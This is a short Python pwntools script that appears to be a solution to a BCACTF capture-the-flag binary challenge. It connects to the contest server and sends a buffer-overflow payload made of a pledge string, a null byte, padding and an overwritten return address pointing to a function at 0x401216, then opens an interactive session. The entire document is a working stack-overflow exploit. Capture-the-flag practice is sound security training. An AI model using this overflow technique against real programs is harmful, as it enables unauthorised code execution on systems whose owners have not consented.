from pwn import *
context.update(os="linux", arch="i686")
#p = process("adv-analysis")
p = remote("bin.bcactf.com", 49156)

PAYLOAD = ("i pledge to not cheat" + "\x00" + ("A" * 42) + "BBBBBBBB").encode("ASCII") + p64(0x401216)

p.recvuntil("> ")
p.sendline(PAYLOAD)
p.interactive()
